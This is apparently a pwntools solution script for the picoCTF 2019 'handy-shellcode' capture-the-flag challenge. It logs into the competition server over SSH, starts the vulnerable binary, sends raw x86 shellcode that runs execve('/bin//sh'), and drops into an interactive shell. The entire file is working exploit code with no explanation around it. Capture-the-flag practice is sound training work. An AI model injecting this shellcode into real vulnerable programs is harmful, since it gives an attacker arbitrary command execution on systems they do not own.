from pwn import *

# ssh
sh = ssh(host="2019shell1.picoctf.com", user="Leonardo", password="XXX")
r = sh.process("/problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln")

payload = "\x31\xC0\x31\xC9\x31\xD2\x83\xC0\x0B\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"
r.sendline(payload)
r.interactive()
